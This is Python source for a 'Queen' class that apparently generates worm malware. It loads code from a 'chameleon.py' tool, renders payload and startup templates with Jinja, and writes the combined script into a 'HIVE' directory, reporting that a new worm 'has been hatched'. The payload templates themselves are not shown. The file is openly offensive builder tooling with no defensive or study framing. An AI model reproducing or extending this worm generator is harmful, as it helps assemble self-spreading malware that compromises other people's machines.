import os

from pathlib import Path
from jinja2 import Template


from ..draco_tools.configurator import Configurator




class Queen:
    def __init__(self, draco_callback: object):
        self.draco = draco_callback
        self.baseConf = Configurator()
        self.linikingDir()
        self.loadChamCode()
        self._temp = {"basic" : self.loadTemp("basicW.py"),
                    "start" : self.loadTemp("startup.py")}
        self._emptyConf = {"MULTIPROCESING_FREEZE" : None}


    
    def linikingDir(self) -> None:
        self.hiveDir = os.path.dirname(__file__)
        self.tempDir = os.path.join(self.hiveDir, "templates")
        self.chamPath = os.path.join(Path(self.hiveDir).parent, "meine_server", "tools", "chameleon.py")
        self.hiveOutDir = os.path.join(self.baseConf.CONF["MAIN_DIR"], "HIVE")
        if not os.path.exists(self.hiveOutDir):
            os.mkdir(self.hiveOutDir)
    
    def loadChamCode(self) -> None:
        with open(self.chamPath, "r") as f:
            self.chamCode = f.read() + "\n\n\n"
    
    def loadTemp(self, name: str) -> str:
        with open(os.path.join(self.tempDir, name), "r") as f:
            data = f.read()
        return data
    
    def renderTemplate(self, types: str, config: dict = {}):
        _conf = self.baseConf.CONF.copy()
        _conf.update(self._emptyConf)
        _conf.update(config)
        code = self._temp[types]
        temp = Template(code)
        rcode = temp.render(_conf)
        return rcode
    

    def saveWorm(self, name: str, types: str, code: str) -> None:
        worm_name = f"{name}_{types}.py"
        with open(os.path.join(self.hiveOutDir, worm_name) , "w") as f:
            f.write(code)
        return worm_name
    
    def hatchering(self, conf: dict = {}):
        a,b,c,d = "", "", "", ""
        
        types = conf.get("SERV_TYPE")
        name = conf.get("NAME")
        match types:
            case "Basic":
                conf.update({"WORM_NAME" : "BasicWorm"})
                a = self.renderTemplate("basic", conf)
        startup = self.renderTemplate("start", conf)
        fcode = self.chamCode + a + b + c + d + startup
        worm_name = self.saveWorm(name, types, fcode)
        self.draco.Msg(sender="QUEEN", msg=f"New Worm <{worm_name}> has been hatched !!!")
        self.draco.Msg(sender="QUEEN", msg="Check Hive Output Directory")

    



